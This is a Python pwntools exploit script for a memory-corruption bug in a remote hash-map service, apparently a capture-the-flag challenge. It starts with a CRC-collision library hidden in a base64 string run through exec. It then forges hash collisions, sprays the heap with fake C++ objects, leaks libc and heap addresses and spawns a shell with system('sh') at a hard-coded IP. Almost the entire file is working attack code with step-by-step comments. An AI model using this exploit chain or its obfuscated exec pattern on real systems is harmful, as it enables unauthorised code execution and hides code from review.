#!/bin/env python

# CRC reverse module start.

# A library with misc. data manipulation functions
#  (c) 2005 - Intrepid Software
#   Bas Westerbaan <bas.westerbaan@gmail.com>

exec 'aGV4Q2hhcnMgPSAnMDEyMzQ1Njc4OWFiY2RlZicKCiMgeG9ycyB0d28gbnVtYmVycyB3aXRoIGEgc3BlY2lmaWMgd2lkdGgKZGVmIFhvcih4LHksdyk6CiAgICByID0gMAogICAgZm9yIHAgaW4gcmFuZ2UoMCwgdyk6CiAgICAgICAgcHAgPSAyNTYgKiogcAogICAgICAgIHBwbSA9IHBwICogMjU2IC0gMQogICAgICAgIHIgKz0gKCgocHBtICYgeCkgPj4gKHAgKiA4KSkgXiAoKHBwbSAmIHkpID4+IChwICogOCkpKSA8PCBwICogOAogICAgcmV0dXJuIHIKCiNkZWYgVGVzdFhvcih4LHksdyk6CiMgICAgcHJpbnQgUGFkU3RyaW5nTGVmdChOdW1iZXJUb0JpbmFyeSh4KSx3KjgsJzAnKQojICAgIHByaW50IFBhZFN0cmluZ0xlZnQoTnVtYmVyVG9CaW5hcnkoeSksdyo4LCcwJykKIyAgICBwcmludCBQYWRTdHJpbmdMZWZ0KE51bWJlclRvQmluYXJ5KFhvcih4LHksdykpLHcqOCwnMCcpCiAgICAKCiMgcmV0dXJucyBhIGJpbmFyeSBzdHJpbmcgcmVwcmVzZW50YXRpb24gb2YgYSBudW1iZXIuCmRlZiBOdW1iZXJUb0JpbmFyeShuKToKICAgIHAgPSAwICAgIyBjdXJyZW50IHBvc2l0aW9uCiAgICBwcCA9IDEgICMgcG9zaXRpb24gdG8gdGhlIHNlY29uZCBwb3dlciwgZGVmYXVsdDogMiAqKiAwCiAgICByID0gJycgICMgcmV0dXJuCiAgICB3aGlsZSBuID49IHBwOgogICAgICAgIGlmIG4gJiBwcDoKICAgICAgICAgICAgciArPSAnMScKICAgICAgICBlbHNlOgogICAgICAgICAgICByICs9ICcwJwogICAgICAgIHAgKz0gMQogICAgICAgIHBwID0gMiAqKiBwICMgY2FjaGUgcG93ZXIKICAgIHJldHVybiBSZXZlcnNlU3RyaW5nKHIpCgojIHJldHVybnMgYSBoZXhhZGVjaW1hbCByZXByZXNlbnRhdGlvbiBvZiBhIG51bWJlci4gCmRlZiBOdW1iZXJUb0hleGFkZWNpbWFsKG4pOgogICAgcCAgID0gMCAgIyBjdXJyZW50IHBvc2l0aW9uCiAgICBwcG0gPSAxNSAjIG5leHQgcG9zaXRpb24gdG8gdGhlIHNpeHRlZW50aCBwb3dlciBtaW51cyAxLCBkZWZhdWx0OiAxNiAqKiAxCiAgICAgICAgICAgICAjICB1c2VkIGFzIE1hc2sKICAgIHBwICA9IDEgICMgY2lycmVtdHBvc2l0aW9uIHRvIHRoZSBzaXh0ZWVudGggcG93ZXIsIGRlZmF1bHQ6IDE2ICoqIDAKICAgIHIgID0gJycgICMgcmV0dXJuCiAgICB3aGlsZSBuID49IHBwOgogICAgICAgIHYgPSAobiAmIHBwbSkgPj4gKHAgKiA0KQogICAgICAgIHIgKz0gaGV4Q2hhcnNbdl0KICAgICAgICBwICs9IDEKICAgICAgICBwcCA9IDE2ICoqIHAKICAgICAgICBwcG0gPSBwcCAqIDE2ICAtIDEgICMgMTYgKiogKHAgKyAxKSAtIDEKICAgIHJldHVybiBSZXZlcnNlU3RyaW5nKHIpCgojIHJldHVybiB0aGUgbnVtYmVyIHJlcHJlc2VudGVkIGJ5IGEgaGV4YWRlY2ltYWwgc3RyaW5nCmRlZiBOdW1iZXJGcm9tSGV4YWRlY2ltYWwocyk6CiAgICBzID0gcy5sb3dlcigpCiAgICByID0gMAogICAgcCA9IDAKICAgIGZvciBpIGluIHJhbmdlKGxlbihzKSAtIDEsIC0xLCAtMSk6CiAgICAgICAgciArPSBoZXhDaGFycy5pbmRleChzW2ldKSAqIDE2ICoqIHAKICAgICAgICBwICs9IDEKICAgIHJldHVybiByCgojIHJldHVybnMgdGhlIG51bWJlciByZXByZXNlbnRlZCBieSBhIGJpbmFyeSBzdHJpbmcKZGVmIE51bWJlckZyb21CaW5hcnkocyk6CiAgICByID0gMAogICAgcCA9IDAKICAgIGZvciBpIGluIHJhbmdlKGxlbihzKSAtIDEsIC0xLCAtMSk6CiAgICAgICAgaWYgc1tpXSA9PSAnMSc6CiAgICAgICAgICAgIHIgKz0gMiAqKiBwCiAgICAgICAgcCArPSAxCiAgICByZXR1cm4gcgogICAgCiMgcmV2ZXJzZXMgYSBzdHJpbmcgKG5vdCB2ZXJ5IGVmZmljaWVudGx5LCBtYXliZSBzaG91bGQgdXNlIGdlbmVyYXRvcikKZGVmIFJldmVyc2VTdHJpbmcocyk6CiAgICByID0gJycKICAgIGZvciBpIGluIHJhbmdlKGxlbihzKSAtIDEsIC0xLCAtMSk6CiAgICAgICAgciArPSBzW2ldCiAgICByZXR1cm4gcgoKIyBwYWRzIGEgc3RyaW5nICdzJyBvbiB0aGUgbGVmdCB3aXRoICdjJyB1bnRpbCBpdCBoYXMgdGhlIGxlbmd0aCAnbCcKZGVmIFBhZFN0cmluZ0xlZnQocywgbCwgYyk6CiAgICByID0gcwogICAgd2hpbGUgbGVuKHIpIDwgbDoKICAgICAgICByID0gYyArIHIKICAgIHJldHVybiByCgojIGlkZW0sIGJ1dCBub3cgb24gdGhlIHJpZ2h0CmRlZiBQYWRTdHJpbmdSaWdodChzLCBsLCBjKToKICAgIHIgPSBzCiAgICB3aGlsZSBsZW4ocikgPCBsOgogICAgICAgIHIgKz0gYwogICAgcmV0dXJuIHIKIyEvYmluL2VudiBweXRob24KIyBBIGxpYnJhcnkgdG8gd29yayB3aXRoIENSQwojICAoYykgMjAwNSAtIEludHJlcGlkIFNvZnR3YXJlCiMgICBCYXMgV2VzdGVyYmFhbiA8YmFzLndlc3RlcmJhYW5AZ21haWwuY29tPgoKIyBOb3RlIG9uIHJlZmxlY3Rpbmc6CiMgIFJlZmxlY3RpbmcgaXMgcHJldHR5IHNpbXBsZSwgcmVmbGVjdGluZyB0aGUgcG9seW5vbWlhbCBpcyBqdXN0IGdvb2QgZW5vdWdoLgoKY2xhc3MgQ3JjUHJvdmlkZXI6CiAgICAjIHRhYmxlCiAgICAjIHdpZHRoCiAgICAjIGJhc2VQb2x5bm9taWFsCiAgICAjIHJlZmxlY3RlZAogICAgIyBpbml0aWFsCiAgICAjIHhvck91dAogICAgIyBwb2x5bm9taWFsCiAgICAjIHN3YXBwZWQKICAgICMgX2hhc2gKICAgIAogICAgZGVmIF9faW5pdF9fKHNlbGYsIHdpZHRoLCBwb2x5bm9taWFsLCByZWZsZWN0ZWQsIGluaXRpYWwsIHhvck91dCwgc3dhcHBlZCk6CiAgICAgICAgc2VsZi53aWR0aCA9IHdpZHRoCiAgICAgICAgc2VsZi5iYXNlUG9seW5vbWlhbCA9IHBvbHlub21pYWwKICAgICAgICBzZWxmLnJlZmxlY3RlZCA9IHJlZmxlY3RlZAogICAgICAgIHNlbGYuaW5pdGlhbCA9IGluaXRpYWwKICAgICAgICBzZWxmLnhvck91dCA9IHhvck91dAogICAgICAgIHNlbGYuc3dhcHBlZCA9IHN3YXBwZWQKCiAgICAgICAgaWYgc2VsZi5yZWZsZWN0ZWQ6CiAgICAgICAgICAgIHNlbGYucG9seW5vbWlhbCA9IFJlZmxlY3ROdW1iZXIoc2VsZi5iYXNlUG9seW5vbWlhbCwKICAgICAgICAgICAgICAgICAgICBzZWxmLndpZHRoICogOCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnBvbHlub21pYWwgPSBzZWxmLmJhc2VQb2x5bm9taWFsCiAgICAgICAgCiAgICAgICAgc2VsZi50YWJsZSA9IHNlbGYuZ2VuZXJhdGVUYWJsZSgpCiAgICAgICAgc2VsZi5yZXNldCgpCgogICAgIyBzaG93IGNyYyB0YWJsZSBpbiBoZXhhZGVjaW1hbAogICAgZGVmIHNob3dUYWJsZShzZWxmKToKICAgICAgICBpZiBsZW4oc2VsZi50YWJsZSkgPiAwOgogICAgICAgICAgICByID0gJycgKyBQYWRTdHJpbmdMZWZ0KE51bWJlclRvSGV4YWRlY2ltYWwoc2VsZi50YWJsZVswXSksICAgICAgICAgICAgICAgICBzZWxmLndpZHRoICogMiwgJzAnKSAKICAgICAgICBlbHNlOgogICAgICAgICAgICByID0gJycKICAgICAgICBmb3IgaSBpbiByYW5nZSgxLCBsZW4oc2VsZi50YWJsZSkpOgogICAgICAgICAgICByICs9ICcsICcgKyBQYWRTdHJpbmdMZWZ0KE51bWJlclRvSGV4YWRlY2ltYWwoc2VsZi50YWJsZVtpXSksICAgICAgICAgICAgICAgICBzZWxmLndpZHRoICogMiwgJzAnKQogICAgICAgIHIgKz0gJycKICAgICAgICBwcmludCByCiAgICAgICAgCiAgICAjIGdlbmVyYXRlcyBhIGNyYyB0YWJsZQogICAgZGVmIGdlbmVyYXRlVGFibGUoc2VsZik6CiAgICAgICAgcmV0ID0gW10KICAgICAgICBwb2x5ID0gUmVmbGVjdE51bWJlcihzZWxmLmJhc2VQb2x5bm9taWFsLCAzMikKICAgICAgICBmb3IgaSBpbiByYW5nZSgwLCAyNTYpOgogICAgICAgICAgICBlbnRyeSA9IGkKICAgICAgICAgICAgZm9yIGogaW4gcmFuZ2UoOCwgMCwgLTEpOgogICAgICAgICAgICAgICAgaWYgZW50cnkgJiAxOgogICAgICAgICAgICAgICAgICAgIGVudHJ5ID0gWG9yKChlbnRyeSA+PiAxKSwgcG9seSwgc2VsZi53aWR0aCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgZW50cnkgPj49IDEKICAgICAgICAgICAgaWYgc2VsZi5yZWZsZWN0ZWQ6CiAgICAgICAgICAgICAgICByZXQuYXBwZW5kKGVudHJ5KQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0LmFwcGVuZChSZWZsZWN0TnVtYmVyKGVudHJ5KSkKICAgICAgICByZXR1cm4gcmV0CgogICAgZGVmIHJlc2V0KHNlbGYpOgogICAgICAgIHNlbGYuX2hhc2ggPSBzZWxmLmluaXRpYWwKICAgICAgICAKICAgIGRlZiBnZXRIYXNoKHNlbGYpOgogICAgICAgIGlmIHNlbGYuc3dhcHBlZDoKICAgICAgICAgICAgaCA9IHNlbGYuY3JjQnl0ZVN3YXAoc2VsZi5faGFzaCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBoID0gc2VsZi5faGFzaAogICAgICAgIHJldHVybiBoIF4gc2VsZi54b3JPdXQKCiAgICAjIGRvZXMgYSBjcmMgYnl0ZXN3YXAgYXMgaW4gdGhlIGZsaGFzaAogICAgZGVmIGNyY0J5dGVTd2FwKHNlbGYsIGhhc2gpOgogICAgICAgIGlmIHNlbGYud2lkdGggIT0gNDoKICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCdDcmMzMiBvbmx5IHN1cHBvcnRzIGJ5dGVzd2FwJykKICAgICAgICBpZiBzZWxmLnJlZmxlY3RlZDoKICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCdieXRlc3dhcCBpcyBhIGRpcnR5IHJlZmxlY3Rpb24sIHVzZSBvbmUgb2YgdGhlbScpCiAgICAgICAgaCA9IChoYXNoID4+IDI0KSB8ICgoaGFzaCA+PiA4KSAmIDB4MDAwMGZmMDApIHwgICAgICAgICAgICAgKChoYXNoIDw8IDI0KSAmIDQyNzgxOTAwODApIHwgKChoYXNoIDw8IDgpICYgMHgwMGZmMDAwMCkKICAgICAgICByZXR1cm4gKGggPj4gMikgfCBOdW1iZXJGcm9tSGV4YWRlY2ltYWwoJzgwMDAwMDAwJykKCiAgICAjIHVwZGF0ZSB0aGUgaGFzaCB3aXRoIGEgc3RyaW5nIG9mIGRhdGEKICAgIGRlZiB1cGRhdGUoc2VsZixzKToKICAgICAgICBmb3IgaSBpbiByYW5nZSgwLCBsZW4ocykpOgogICAgICAgICAgICBzZWxmLl9oYXNoID0gWG9yKHNlbGYuX2hhc2ggPj4gOCwgc2VsZi50YWJsZVtYb3Iob3JkKHNbaV0pLCAgICAgICAgICAgICAgICAgc2VsZi5faGFzaCAmIDB4ZmYsMSldLCBzZWxmLndpZHRoKQoKICAgICMgY2FsY3VsYXRlcyB0aGUgYnl0ZXMgbmVjY2Vzc2FyeSB0byBhcHBlbmQgdG8gZ2V0IGZyb20gdGhlIGN1cnJlbnQKICAgICMgIHRvIHRoZSBzcGVjaWZpZWQgaGFzaC4KICAgICMgTkI6IFNXQVBQRUQgSVNOJ1QgU1VQUE9SVEVECiAgICAjIFRoZXJlIGFyZSBzb21lIGNvbW1lbnRlZCBvdXQgZGVidWcgcHJpbnQncywgd2hpY2ggY2FuIGJlIHZlcnkKICAgICMgICAgIHVzZWZ1bGwuCiAgICAjIHRoaXMgYWxnb3JpdGhtIGlzIHZhZ3VlbHkgZGVyaXZlZCBmcm9tIEFuYXJjaHJpeidzIG1ldGhvZC4KICAgIGRlZiBwYXRjaChzZWxmLCB3YW50ZWQpOgogICAgICAgIHcgPSBYb3Iod2FudGVkLCBzZWxmLnhvck91dCwgc2VsZi53aWR0aCkgICAgICAgICAgICAKICAgICAgICBsdXQgPSBbXQogICAgICAgIGZvciBpIGluIHJhbmdlKDAsbGVuKHNlbGYudGFibGUpKToKICAgICAgICAgICAgbHV0LmFwcGVuZChzZWxmLnRhYmxlW2ldKQogICAgICAgIGx1dC5zb3J0KCkKICAgICAgICBtID0gW10KICAgICAgICByID0gJycKICAgICAgICBmb3IgcCBpbiByYW5nZSgwLCBzZWxmLndpZHRoKToKICAgICAgICAgICAgbS5hcHBlbmQoKHNlbGYuX2hhc2ggJiAoMjU2KioocCsxKS0xKSkgPj4gKDggKiBwKSkKICAgICAgICBmb3IgcCBpbiByYW5nZSgwLCBzZWxmLndpZHRoKToKICAgICAgICAgICAgbS5hcHBlbmQoKHcgJiAoMjU2KioocCsxKS0xKSkgPj4gKDggKiBwKSkKICAgICAgICBmb3IgcCBpbiByYW5nZShzZWxmLndpZHRoIC0gMSwgLTEsIC0xKToKICAgICAgICAgICAgbyA9IGx1dFttW3Arc2VsZi53aWR0aF1dCiAgICAgICAgICAgICNwbShtKQogICAgICAgICAgICAjcHJpbnQgJ3M6ICcgKyBoZXgobVtwK3NlbGYud2lkdGhdKSArICcgdjogJyArIE51bWJlclRvSGV4YWRlY2ltYWwobykgKyAnIGk6ICcgKyBoZXgoc2VsZi50YWJsZS5pbmRleChvKSkKICAgICAgICAgICAgI2ZvciBkYiBpbiByYW5nZSgwLHApOgogICAgICAgICAgICAjICAgIHByaW50IGhleChtW2RiXSkKICAgICAgICAgICAgI3ByaW50IGhleChtW3BdKSArICIgXiAiICsgaGV4KHNlbGYudGFibGUuaW5kZXgobykpICsgIiAtPiAiICsgaGV4KFhvcihtW3BdLHNlbGYudGFibGUuaW5kZXgobyksMSkpCiAgICAgICAgICAgIGZvciBxIGluIHJhbmdlKDAsc2VsZi53aWR0aCk6CiAgICAgICAgICAgICAgICB2ID0gKG8gJiAoMjU2KioocSsxKS0xKSkgPj4gKDggKiBxKQogICAgICAgICAgICAjICAgIHByaW50IGhleCh2KSArICIgXiAiICsgaGV4KG1bcCtxKzFdKSArICcgLT4gJyArIGhleChYb3IobVtwK3ErMV0sdiwxKSkKICAgICAgICAgICAgICAgIG1bcCtxKzFdID0gWG9yKG1bcCtxKzFdLHYsMSkKICAgICAgICAgICAgbVtwXSA9IFhvcihtW3BdLHNlbGYudGFibGUuaW5kZXgobyksMSkKICAgICAgICAgICAgI2ZvciBkYiBpbiByYW5nZShwK3NlbGYud2lkdGgsc2VsZi53aWR0aCoyLTEpOgogICAgICAgICAgICAjICAgIHByaW50IGhleChtW2RiXSkKICAgICAgICAjcG0obSkKICAgICAgICBmb3IgcCBpbiByYW5nZSgwLCBzZWxmLndpZHRoKToKICAgICAgICAgICAgciArPSBjaHIobVtwXSkKICAgICAgICByZXR1cm4gcgogICAKICAgIGhhc2ggPSBwcm9wZXJ0eShnZXRIYXNoKQoKI2RlZiBwbShtKToKIyAgICByID0gJycKIyAgICBmb3IgaSBpbiByYW5nZSgwLGxlbihtKSk6CiMgICAgICAgIHIgKz0gIiAiICsgUGFkU3RyaW5nTGVmdChOdW1iZXJUb0hleGFkZWNpbWFsKG1baV0pLDIsJzAnKQojICAgIHByaW50IHIKICAgIApjbGFzcyBDcmMzMlByb3ZpZGVyKENyY1Byb3ZpZGVyKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCB3aWR0aCA9IDQsIHBvbHlub21pYWwgPSA3OTc2NDkxOSwgcmVmbGVjdGVkID0gVHJ1ZSwKICAgICAgICBpbml0aWFsID0gNDI5NDk2NzI5NSwgeG9yT3V0ID0gNDI5NDk2NzI5NSwgc3dhcHBlZCA9IEZhbHNlKToKICAgICAgICByZXR1cm4gQ3JjUHJvdmlkZXIuX19pbml0X18oc2VsZiwgd2lkdGgsIHBvbHlub21pYWwsIHJlZmxlY3RlZCwgICAgICAgICAgICAgaW5pdGlhbCwgeG9yT3V0LCBzd2FwcGVkKQoKY2xhc3MgQ3JjMTZQcm92aWRlcihDcmNQcm92aWRlcik6CiAgICBkZWYgX19pbml0X18oc2VsZiwgd2lkdGggPSAyLCBwb2x5bm9taWFsID0gMzI3NzMsIHJlZmxlY3RlZCA9IFRydWUsCiAgICAgICAgaW5pdGlhbCA9IDAsIHhvck91dCA9IDAsIHN3YXBwZWQgPSBGYWxzZSk6CiAgICAgICAgcmV0dXJuIENyY1Byb3ZpZGVyLl9faW5pdF9fKHNlbGYsIHdpZHRoLCBwb2x5bm9taWFsLCByZWZsZWN0ZWQsICAgICAgICAgICAgIGluaXRpYWwsIHhvck91dCwgc3dhcHBlZCkgICAgICAgICAgICAgCmNsYXNzIEZsQ3JjUHJvdmlkZXIoQ3JjUHJvdmlkZXIpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHdpZHRoID0gNCwgcG9seW5vbWlhbD0gNjcxMTA1MDI0LCByZWZsZWN0ZWQgPSBGYWxzZSwKICAgICAgICBpbml0aWFsID0gMCwgeG9yT3V0ID0gMCwgc3dhcHBlZCA9IFRydWUpOgogICAgICAgIHJldHVybiBDcmNQcm92aWRlci5fX2luaXRfXyhzZWxmLCB3aWR0aCwgcG9seW5vbWlhbCwgcmVmbGVjdGVkLCAgICAgICAgICAgICBpbml0aWFsLCB4b3JPdXQsIHN3YXBwZWQpICAgICAgICAgICAgIAoKCiMgZ2V0cyB0aGUgYmluYXJ5IHJlcHJlc2VudGF0aW9uIG9mIHRoZSBudW1iZXIgYW5kIHR1cm5zIGl0IGFyb3VuZC4KIyAgYWxnb3JpdGhtIGNvdWxkIGJlIG1vcmUgZWZmaWNpZW50LgojIHRoaXMgZnVuY3Rpb24gY2FuIGJlIHVzZWQgdG8gZ2V0IGEgcmVmbGVjdGVkIHBvbHlub21pYWwgdG8gZ2VuZXJhdGUKIyAgYSByZXZlcnNlZCBjcmMgdGFibGUuCiMgVGhlIGRlZmF1bHQgd2lkdGggaXMgNCBieXRlcywgdGhpcyBpcyB0aGUgZXh0cmEgJzAnIHBhZGRpbmcgZG9uZSB0byBlbnN1cmUgMQojICB3aWxsIGJlY29tZSAyMTQ3NDgzNjQ4IGluc3RlYWQgb2YgMS4KZGVmIFJlZmxlY3ROdW1iZXIobnVtYmVyLCB3aWR0aCA9IDMyKToKICAgIGIgPSBQYWRTdHJpbmdMZWZ0KE51bWJlclRvQmluYXJ5KG51bWJlciksIHdpZHRoLCAnMCcpCiAgICByZXR1cm4gTnVtYmVyRnJvbUJpbmFyeShSZXZlcnNlU3RyaW5nKGIpKQ=='.decode('base64')

    
# Exploit start. Merged files in convinience.

from pwn import *
from hashlib import sha1

HOST, PORT = '47.107.237.147', 8888
r = remote(HOST, PORT)

def add(key, value):
	menu_string='1'
	r.sendline(menu_string)
	r.sendline(str(value))
	if str(value)[0] not in '123456789':
		return
	r.sendline(key)

def collision(hash, prefix=''):
	i = 0
	crc = Crc32Provider()
	while True:
		crc.reset()
		crc.update(prefix + str(i))
		yield prefix + str(i) + crc.patch(hash)
		i += 1

r.recvuntil('with \'')
prefix = r.recvuntil('\'', drop=True)

def generate(prefix):
    print 'Generating POW'
    i = 0
    z = [prefix, None]
    while True:
            z[1] = '%06x' % i
            if sha1(''.join(z)).digest().startswith('\x00'):
                    break
            i += 1
    p = ''.join(z)
    return p

p = generate(prefix)
print 'POW generated: %r' % p[:100]
r.sendline(p)

###############################################################################
# Vulnerability: HashMap OOB access for a large hash
#
# In this program, HashMap operates in open addressing mode.
# It means, if same CRC32 hash exists in table, it looks for next entry.
#
# HashMap::get : it correctly does next_index = (cur_index + 1) % nbuckets;
# HashMap::set : next_index = cur_index + 1; <-- omg
#
# HashMap::set has OOB access for large hash, and Key->compare() is virtual.
# struct HashMap { std::vector keys; Pair *buckets[4096]; }
# struct Pair    { const char *value; Key *key; }
# So we can make a fake object with fake vftable to modify PC.
# To do this...
###############################################################################
# Step 1. Creating a fake hashmap entries
# HashMap->buckets[4096, 4097] = <user controlled data>

# 1-1. preparing a user-controllable area right after the hashmap
r.sendline('9'*64)
r.sendline('2')
r.sendline('a'*32)

# 1-2. It fills last(4095th) entry in the hashmap.
c = collision(0xffff)
for i in range(2):
	print `c.next()`
add(c.next(), 1)

# r.interactive()

# 1-3. This is for rearranging recently-freed fastbins..
#      for achieving a user-controlled area right after the hashmap
for i in range(2):
	r.sendline('2')
	r.sendline('a'*32)

# At this point, the heap area will be:
# ------------------------------------------------
# | HashMap map ...  | 40byte freed fastbin | .. |
# ------------------------------------------------
# In my exploit, 4096th, 4097th will be
# 1) key: NULL, value: 0x29?
# 2) key: buf,  value: NULL
# I did heap spray for a fake objects.
buf = 0x2500008
obj = ''
# - This is first pair. value will be uncontrollable chunk size object.
obj += p64(0)
# - This is the second pair. It's **STAGE 1** payload which overwrites:
#   ::map = new StringKey(obj)
obj += p64(0) + p64(buf)
# - For fitting the fastbin size (this area is freed as fastbin before)
obj = obj.ljust(34,'A')
#   and.. reversing CRC for convinient OOB.
obj = collision(0xffff,obj).next()
# This locates two pair above, sets first pair to key: `obj`, value: "shrimp"
# Fills buckets[4096].
add(obj, 1)

pause()

# Below is fake C++ objects & fake hashmap bucket item pairs.

# These are three targets to write with a heap address (StringKey object)
target1 = 0x605880     # HashMap     map = heap
target2 = 0x6058a0     # std::string pow.ptr = heap
target3 = 0x6058b0 + 1 # std::string pow.capacity = heap << 8

# payload2 will be placed at [x & ~0xfff for x in (heap_base + A, heap_base + B, 0x1000)]

# Stage 1 object: ::map = new StringKey(obj)
payload2 = 'a' * 8 + p64(buf + 24) + p64(target1) + p64(0) + p64(0x40201c)
payload2 = payload2.ljust(48)
# Stage 2 objects:
# 2-1. leak(arbitrary address)
payload2 += p64(buf + 48) + p64(0x4014e0)
# 2-2. ::pow.ptr = new StringKey(obj)
payload2 += p64(buf + 56 + 24) + p64(target2) + p64(0) + p64(0x40201c)
# 2-3. ::pow.capacity = new StringKey(obj) << 8
payload2 += p64(buf + 88 + 24) + p64(target3) + p64(0) + p64(0x40201c)
# 2-4. *calls proof_of_work() for arbitrary write in ::map*
payload2 += p64(buf + 128) + p64(0x401a49)
# This null pointers are used for 1, 2-2, 2-3.
payload2 = payload2.ljust(0x100) + p64(0) * 16

# Let me explain this shortly.
# 0x4014e0 is atoi. It'll return 8 because <rdi> has p64(0x2500048).
# 0x40201c is HashMap::set. I used this to overwrite any pointer to a heap ptr.
# 0x401a49 is proof_of_work for arbitrary write in heap area.

# Stage 2. Calling a fake entry via HashMap::get
# Since ::map is now a dangling heap pointer, I can provide some fake entries.
# In this case, payload will be at buckets[10~].

# Below is fake hashmap bucket entries & heap spray
payload = p64(0) + p64(0x605018) + p64(buf + 40) + p64(0x605880) + p64(buf + 40) + p64(0) + p64(buf + 56) + p64(0) + p64(buf + 88) + p64(0) + p64(buf + 120)
payload = payload.ljust(0x1000 - 0xe90, 'a')

# This is also used for heap spray.
while len(payload) < 0xf000:
    payload += payload2.ljust(0x1000)

# It's calculated to fill buf address.
cnt = (1<<26)/0x10000
print cnt
for i in range(cnt):
    sys.stdout.write('Spraying heap - %4d (%02.2f%% done)\r\n'%(i + 1, 1.0*i/cnt*100))
    add(payload.ljust(0x10000-1-8), 1)

# Triggers buckets[4097]->compare().
add(c.next(), 1)

# Stage 2-1. Now ::map is modified, so we select some bucket and trigger it.

# map->buckets[10]->compare() --> libc leak
r.sendline('2')
r.sendline(collision(10).next())
r.recvuntil('You ordered ')
setvbuf = u64(r.recvline()[:-1].ljust(8, '\x00'))
libc = ELF('./libc6.so')
libc.address = setvbuf - libc.symbols['setvbuf']
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

# map->buckets[11]->compare() --> heap base leak
r.sendline('2')
r.sendline(collision(11).next())
r.recvuntil('You ordered ')
heap = u64(r.recvline()[:-1].ljust(8, '\x00'))
print hex(heap)
pause()

# map->buckets[12]->compare() --> ::pow.ptr = new StringKey()
r.sendline('2')
r.sendline(collision(12).next())

# map->buckets[13]->compare() --> ::pow.capacity = new StringKey() << 8
r.sendline('2')
r.sendline(collision(13).next())

# map->buckets[14]->compare() --> proof_of_work()
r.sendline('2')
r.sendline(collision(14).next())
r.recvuntil('with \'')
prefix = r.recvuntil("'", drop=True)

# proof_of_work() -> map->buckets[15] = 0x??007368-8
# 0x??007368-8 --> 0x??007368 ("sh\x00?") --> system("sh")
addr = (heap + 0xffffff) & ~0xffffff
addr += u16('sh')
print hex(addr)
obj = prefix + '\x00' * 16 * 13 + p64(0) + p64(addr - 8) + 'a' * (addr - 8 - heap - 280) + p64(addr) + p64(system)
r.sendline(generate(obj))
r.interactive()
